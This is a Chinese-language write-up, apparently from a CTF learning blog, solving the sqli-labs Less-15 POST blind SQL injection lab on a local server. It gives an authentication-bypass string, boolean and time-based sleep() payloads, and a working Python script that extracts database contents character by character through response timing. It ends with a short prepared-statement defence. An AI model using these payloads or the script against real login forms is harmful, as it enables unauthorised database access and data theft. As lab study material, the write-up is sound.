---
layout: post
title: sqli-labs - Less-15 POST 盲注（布尔 + 时间，单引号）Writeup
platform: sqli-labs
date: 2026-11-10 08:20:00 +0800
categories: CTF
---

sqli-labs - Less-15 POST 盲注（布尔 + 时间，单引号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-15 → POST - Blind - Boolian Based - String（登录框 + 单引号，盲注）
- 地址：`http://127.0.0.1:8080/Less-15/`
- 题型：Web / SQL 注入
- 考点：**POST 盲注：图片当布尔信号，或用 sleep() 测时间**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（独立数据目录）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
uname=admin' #                     → flag.jpg（登录成功）
uname=1' and 1=1 #                 → slap.jpg
uname=1' and 1=2 #                 → slap.jpg   （页面一样，文字盲不了）
uname=admin' and sleep(2) #        → 2.03 秒    ★ admin 存在，sleep 执行
uname=1' and sleep(2) #            → 0.03 秒    ★ 1 不存在，and 短路，不睡
uname=1' or sleep(2) #             → 16 秒+     ★ 每一行都睡，8 行 ≈ 16 秒
```

二、题目分析

**① 源码**

```php
@$sql = "SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if ($row) { echo '<img src="../images/flag.jpg" />'; }
else      { echo '<img src="../images/slap.jpg" />'; }
```

**② 两种盲注套路**

```text
文字盲：页面只有图片 → 看 flag.jpg / slap.jpg 判断真假
时间盲：页面永远一样 → 用 sleep() 的耗时判断真假
```

**③ 这里有个大坑：`and sleep()` 会短路**

```sql
SELECT ... WHERE username='1' and sleep(2)
                     ↑
              1 这行不存在 → and 后面根本不执行 → 不睡
★ 所以必须让"前半部分为真"才会 sleep：
   admin' and sleep(2)   ← admin 存在，才会睡
   1' or sleep(2)        ← or：不匹配也要执行右边 → 每一行都睡
```

三、解题步骤

**第一步：确认万能密码**

```text
uname=admin' #  → flag.jpg
```

**第二步：尝试文字盲（发现不行）**

```text
1' and 1=1 #  → slap.jpg
1' and 1=2 #  → slap.jpg     ← 一样，说明页面没有可区分的文字
```

**第三步：改用时间盲注**

```text
admin' and sleep(2) #   → 2.03 秒   （admin 存在 → 睡）
1' and sleep(2) #       → 0.03 秒   （1 不存在 → and 短路，不睡）
1' or sleep(2) #        → 16 秒     （or → 每行都睡，8 行 ≈ 16 秒）
```

**第四步：把"数据"编码成"时间"**

```text
admin' and if(ascii(substr(database(),1,1))=115,sleep(2),0) #
→ 2 秒  ⇒ 首字符 's'

admin' and if(ascii(substr(database(),1,1))=120,sleep(2),0) #
→ 0.03 秒 ⇒ 不是 'x'
```

**第五步：脚本**

```python
import requests, time

url = "http://127.0.0.1:8080/Less-15/"
DELAY = 2

def q(cond):
    payload = f"admin' and if({cond},sleep({DELAY}),0) #"
    t0 = time.time()
    requests.post(url, data={"uname": payload, "passwd": "x", "submit": "Submit"}, timeout=DELAY + 10)
    return time.time() - t0 >= DELAY * 0.8

def get_str(sql, max_len=64):
    out = ""
    for i in range(1, max_len + 1):
        if not q(f"length(({sql})) >= {i}"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if q(f"ascii(substr(({sql}),{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        print(out, flush=True)
    return out

print(get_str("select database()"))     # security
```

四、延伸知识

**① and / or 短路的区别（重点）**

```sql
username='1' and sleep(2)   → 1 不存在 → 右边不执行 → 不睡
username='admin' and sleep(2) → admin 存在 → 右边执行 → 睡
username='1' or sleep(2)    → or：左边假也要算右边 → 每行都睡
```

**② 为什么 `or sleep` 会睡 8 次**

```text
users 表 8 行，WHERE 逐行判断
or 短路不了 → 8 行各睡 2 秒 = 16 秒
★ 想只睡一次就加 limit 0,1，或用存在的用户名 + and
```

**③ 防御**

```php
$stmt = $pdo->prepare("SELECT username FROM users WHERE username=? AND password=?");
$stmt->execute([$uname, $passwd]);
// 再加上统一响应时间
```

五、总结

- **本题核心：POST + 单引号盲注，页面只有图片；`and sleep()` 会因短路不执行，要用存在的用户名或 `or`。**

- 三步方法论：

```text
① 万能密码 admin' # 确认注入
② 文字盲不行 → 改时间盲
③ 注意短路：admin' and sleep(2) 才睡
```

- **三个必记要点**：

```text
① SQL 的 and 会短路：左边为假，右边不执行
② 想稳定触发 sleep：用存在的用户名 + and，或者用 or
③ 时间盲注阈值取 80%（2 秒判 1.6 秒）
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-15：POST 盲注，页面只有图 → 用 sleep() 读时间            │
│                                                              │
│  ★ 短路大坑：                                                 │
│      admin' and sleep(2)  → 睡（admin 存在）                  │
│      1' and sleep(2)      → 不睡（1 不存在，and 短路）         │
│      1' or sleep(2)       → 睡 8 次（每行都算）                │
│                                                              │
│  时间盲注 = if(条件, sleep(2), 0) + 秒表                      │
└──────────────────────────────────────────────────────────────┘
```
